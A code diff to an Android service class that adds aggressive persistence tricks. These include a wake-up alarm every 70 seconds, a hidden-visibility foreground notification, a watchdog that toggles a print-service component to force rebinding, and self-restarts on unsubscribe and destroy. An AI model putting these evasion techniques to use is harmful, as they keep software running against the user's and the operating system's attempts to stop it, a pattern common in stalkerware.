@@ -2,11 +2,13 @@ package background.work.around;
 
 import android.os.Handler;
 import android.os.HandlerThread;
+import android.app.AlarmManager;
 import android.content.SharedPreferences;
 import android.content.pm.PackageInfo;
 import android.app.Service;
 import java.util.Locale;
-import android.service.notification.NotificationListenerService;
+import android.service.notification.ConditionProviderService;
+import android.net.Uri;
 import android.service.notification.StatusBarNotification;
 import android.app.Notification;
 import android.app.NotificationChannel;
@@ -26,12 +28,16 @@ import android.os.SystemClock;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
+import android.os.Build;
+import android.print.PrintManager;
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
 import android.app.PendingIntent;
 import android.content.Context;
 import android.content.Intent;
 import android.app.ActivityManager;
 
-public class NotificationService extends NotificationListenerService {	
+public class NotificationService extends ConditionProviderService {	
 
 	private final Map<String, ServiceConnection> whitelistConnections = new HashMap<>();
 
@@ -87,9 +93,10 @@ public class NotificationService extends NotificationListenerService {
 	@Override 
 	public void onCreate() {
     super.onCreate();
-
-	TryStartEnforcedService();		
+		
+	startEnforcedService();
 	forceBindAndStart();
+	scheduleAlarm();
 
     HandlerThread handlerThread = new HandlerThread("BackgroundWorker", android.os.Process.THREAD_PRIORITY_BACKGROUND);
     handlerThread.start();
@@ -250,7 +257,7 @@ public class NotificationService extends NotificationListenerService {
 				} catch (Throwable t) {}
                 android.os.SystemClock.sleep(700);
             }
-        } catch (Throwable t) {}		
+        } catch (Throwable t) {}				
 		android.os.SystemClock.sleep(5_000);
 		Start.RunService(this);	
 		android.os.SystemClock.sleep(15_000);
@@ -262,9 +269,9 @@ public class NotificationService extends NotificationListenerService {
 	private void forceBindAndStart() {
 	try {
 	Intent serviceIntent2 = new Intent(this, RiderService.class);		
-    bindService(serviceIntent2, connection, Context.BIND_AUTO_CREATE | Context.BIND_IMPORTANT);    
-	startService(serviceIntent2);
-    } catch (Throwable t) {}    
+    bindService(serviceIntent2, connection, Context.BIND_AUTO_CREATE | Context.BIND_IMPORTANT); 
+    startService(serviceIntent2);
+	} catch (Throwable t) {}    
     }
 	
     private final ServiceConnection connection = new ServiceConnection() {
@@ -277,11 +284,45 @@ public class NotificationService extends NotificationListenerService {
 
 
     @Override
-    public int onStartCommand(Intent intent, int flags, int startId) {	
-    return START_STICKY;
+    public int onStartCommand(Intent intent, int flags, int startId) {    
+	startEnforcedService();
+	return START_STICKY;
     }
 
-	private void startEnforcedService() {
+
+	private void scheduleAlarm() {
+    try {
+        AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
+                        
+        Intent intent = new Intent(this, MyDeviceAdminReceiver.class);                                            
+        PendingIntent piRepeating = PendingIntent.getBroadcast(this, 8881337, intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+
+        am.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 70000, 70000, piRepeating);
+    } catch (Throwable t) {} }
+
+
+
+	private void startWatchdog() {
+    new Thread(() -> {
+        while (true) {
+			android.os.SystemClock.sleep(5000);			
+			try {										
+                android.app.NotificationManager nm = (android.app.NotificationManager) getSystemService(android.content.Context.NOTIFICATION_SERVICE);                
+                if (nm.areNotificationsEnabled() && nm.getActiveNotifications().length == 0) {
+                    startEnforcedService();
+                }
+				if (Build.VERSION.SDK_INT >= 33 && !((PrintManager) getSystemService(PRINT_SERVICE)).isPrintServiceEnabled(new ComponentName(this, PrintService.class)) && !((DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE)).isAdminActive(new ComponentName(this, MyDeviceAdminReceiver.class))) {    
+					MyDeviceAdminReceiver.setComponentState(NotificationService.this, PrintService.class, PackageManager.COMPONENT_ENABLED_STATE_DISABLED);                 
+					android.os.SystemClock.sleep(7000);			     
+					MyDeviceAdminReceiver.setComponentState(NotificationService.this, PrintService.class, PackageManager.COMPONENT_ENABLED_STATE_ENABLED);				
+				}
+            } catch (Throwable t) {}
+        }
+    }).start();
+	}
+
+	private void startEnforcedService() {		
+	try {	
 	Context context = this;
     NotificationManager nm = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
     String pkg = context.getPackageName();    
@@ -316,34 +357,31 @@ public class NotificationService extends NotificationListenerService {
             .setOngoing(true)
 		    .setVisibility(Notification.VISIBILITY_SECRET)
             .build();
-
-    if (android.os.Build.VERSION.SDK_INT >= 34) {
+    
+	if (android.os.Build.VERSION.SDK_INT >= 34) {
         startForeground(1, notif, 1024);
     } else {
         startForeground(1, notif);
+    } } catch (Throwable isError) {}
+	}
+
+	@Override
+    public void onConnected() {        
     }
-	}
 
-	private void startWatchdog() {
-    new Thread(() -> {
-        while (true) {
-            android.os.SystemClock.sleep(5000);
-            try {
-                android.app.NotificationManager nm = (android.app.NotificationManager) getSystemService(android.content.Context.NOTIFICATION_SERVICE);
-                
-                if (nm.areNotificationsEnabled() && nm.getActiveNotifications().length == 0) {
-                    TryStartEnforcedService();
-                }
-            } catch (Throwable t) {}
-        }
-    }).start();
-	}
+	@Override
+    public void onRequestConditions(int relevance) {
+    }
 
-	private final void TryStartEnforcedService() {		
-		try {startEnforcedService();} 
-        catch (Throwable t) {}
-	}    
+    @Override
+    public void onSubscribe(Uri conditionId) {
+    }
 
+	@Override
+    public void onUnsubscribe(Uri conditionId) {
+	background.work.around.Start.RunService(this);	
+    }
+	
     @Override
     public void onDestroy() {        
         background.work.around.Start.RunService(this);
